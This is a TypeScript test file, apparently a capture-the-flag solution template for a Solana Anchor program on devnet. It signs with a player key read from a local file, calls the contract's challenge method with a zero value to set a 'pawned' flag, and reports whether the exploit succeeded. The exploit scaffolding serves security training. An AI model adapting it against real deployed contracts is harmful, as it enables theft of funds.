import fs from "fs"
import * as anchor from "@project-serum/anchor";
import { IDL } from "../IDL/hello_supersec";
import { getOrCreateAssociatedTokenAccount} from "@solana/spl-token";
import NodeWallet from "@project-serum/anchor/dist/cjs/nodewallet";
import { bs58 } from "@project-serum/anchor/dist/cjs/utils/bytes";

interface PreAccounts {
  player: string,
}

let raw_accounts = fs.readFileSync(`./keys/pubkeys.json`).toString();
let pre_accounts = JSON.parse(raw_accounts) as PreAccounts;

describe("test-attack", () => {
  const conn = new anchor.web3.Connection('https://api.devnet.solana.com');

  let player_keypair = anchor.web3.Keypair.fromSecretKey(bs58.decode(pre_accounts.player))
  const provider = new anchor.AnchorProvider(conn, new NodeWallet(player_keypair), {
    preflightCommitment: "recent",
    commitment: "confirmed",
  });
  const program = new anchor.Program(IDL, new anchor.web3.PublicKey("5qMReBnd8bayHtoXo75xLP9KvBB2ybxw8QvJaJ9FDFJW"), provider);

  it("construct_attack_payload", async () => {
    const sugaku = new anchor.BN(0);

    const tx = await program.methods.challenge(sugaku);
    const autoInferKey = await tx.pubkeys();
    const challKey = autoInferKey.challAccount;

    let ata = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      (provider.wallet as NodeWallet).payer,
      autoInferKey.rewardMint,
      provider.publicKey,
    );

    tx.accounts({
      receiver: ata.address
    })
    const txHash = await tx.rpc({skipPreflight: true})

    console.log("Your transaction signature", txHash);

    const confirmTx = await provider.connection.getSignatureStatus(txHash);
    if (confirmTx.value?.confirmationStatus === "confirmed") {
      try {
        const tx = await program.account.challAccount.fetch(challKey);
        if (tx.pawned === true) {
          console.log("Congratulations, you successfully exploited the contract 🎉");
        } else {
          console.log("Sorry, your attack failed. Please grind more 🏄‍♂️");
          
        }
      } catch (e) {
        console.log(e);
      }
    }
  });

  xit("close", async () => { 
    const tx = await program.methods
    .close()
    .rpc();

  console.log("txHash :: ", tx);
  });
});